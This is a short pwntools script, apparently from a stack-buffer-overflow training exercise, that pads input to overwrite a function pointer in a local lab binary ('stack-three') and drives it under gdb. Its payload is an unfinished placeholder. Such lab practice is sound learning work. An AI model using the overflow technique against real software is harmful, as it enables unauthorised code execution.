from pwn import *
import pwn
print(dir(pwn.gdb))

'''
build:
gcc stack-three.c -o stack-three -g

GDB Commands:
gdp stack-three --tui
break main
step # to line 40
info address complete_level
print locals.fp=0x########
'''

padding = 'A'*64
payload = 'A'*4
exploit = f'{padding}{payload}'
print(exploit)
g = gdb.debug('./stack-three', '''
#break main
''', api=True)
print(g)
print(dir(g))
g.gdb.Breakpoint('main')
g.gdb.continue_and_wait()

print(g)
print(dir(g))
g.sendline(exploit)
print(g.readlineS())
g.close()
